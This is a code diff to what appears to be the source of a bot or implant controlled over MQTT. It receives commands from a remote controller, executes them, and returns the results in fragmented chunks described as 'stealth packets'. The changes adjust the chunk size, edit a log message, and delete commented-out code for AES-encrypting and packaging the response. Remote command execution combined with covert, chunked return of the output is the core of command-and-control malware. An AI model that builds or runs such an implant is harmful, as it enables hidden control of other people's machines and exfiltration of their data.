@@ -30,7 +30,7 @@ def send_fragmented_response(client, raw_result):
     """Breaks large results into 512-byte stealth packets"""
     #  leave room for prefix 'CHK:00:00:' (approx 12 chars)
     # 512 (target) - 4 (len prefix) - 12 (chunk metadata) = ~490
-    # todo is the metadata always 12 chars?
+    #  use slightly smaller to be safe
     chunk_size = 480
 
     # Split the big string into pieces
@@ -74,19 +74,8 @@ def on_message(client, userdata, msg):
             print(f"[DEBUG]: Received command: {action} {argument}, executing...")
             result = get_action_result(action, argument)
             
-            print(f"[*] Dispatching response ({len(result)} bytes) in stealth chunks...")
+            print(f"[*] Dispatching response ({len(result)} bytes) in chunks...")
             send_fragmented_response(client, result)
-            # Hide the response
-            # encrypted_res_b64 = encrypt_payload_AES_then_b64(result)
-            # res_packet = create_bot_packet(encrypted_res_b64)
-
-
-            # print("----")
-            # print(f"[DEBUG]: showcase of the response being sent:")
-            # print(json.dumps(res_packet, indent=4))
-            # print("----")
-
-            # client.publish(TOPIC, json.dumps(res_packet))
 
     except:
         # ignore other messages
